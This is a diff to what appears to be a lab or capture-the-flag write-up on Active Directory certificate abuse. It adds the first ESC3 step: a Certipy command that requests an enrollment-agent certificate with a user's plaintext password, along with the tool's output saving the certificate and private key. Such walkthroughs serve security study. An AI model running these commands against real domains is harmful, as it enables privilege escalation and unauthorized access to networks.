@@ -782,5 +782,18 @@ Two possible paths ESC3 or 7
 ## ESC3
 
 ```python
+certipy-ad req -u 'sam.h@shadowgate.local' -p 'Password123!' -dc-ip '10.1.232.232' -target 'sg-dc01.shadowgate.local' -ca 'Shadowgate-CA' -template 'Shadowgate-EnrollmentAgent' -ldap-scheme ldap
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 5
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'sam.h@shadowgate.local'
+[*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-1114'
+[*] Saving certificate and private key to 'sam.h.pfx'
+[*] Wrote certificate and private key to 'sam.h.pfx'
+```
+
+```python
 
 ```
